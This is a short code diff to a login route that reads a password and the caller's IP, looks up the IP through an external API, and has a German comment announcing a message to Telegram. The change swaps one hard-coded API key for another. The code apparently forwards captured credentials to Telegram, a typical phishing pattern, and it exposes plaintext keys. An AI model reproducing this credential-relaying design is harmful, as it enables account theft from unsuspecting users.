@@ -271,7 +271,7 @@ def login():
     password = request.args.get('password')
     ip = request.remote_addr
     # IP-Daten von ip-api.com abrufen
-    response = requests.get(f"https://ipfinder.ch/api?ip={ip}&key=9Z8MXMiJEBgR9sL3kbvn")
+    response = requests.get(f"https://ipfinder.ch/api?ip={ip}&key=k77HmYtpwLcLo5Lb5GN3")
     print(response.json())
     ip_data = (response.json())
     # Nachricht an Telegram senden
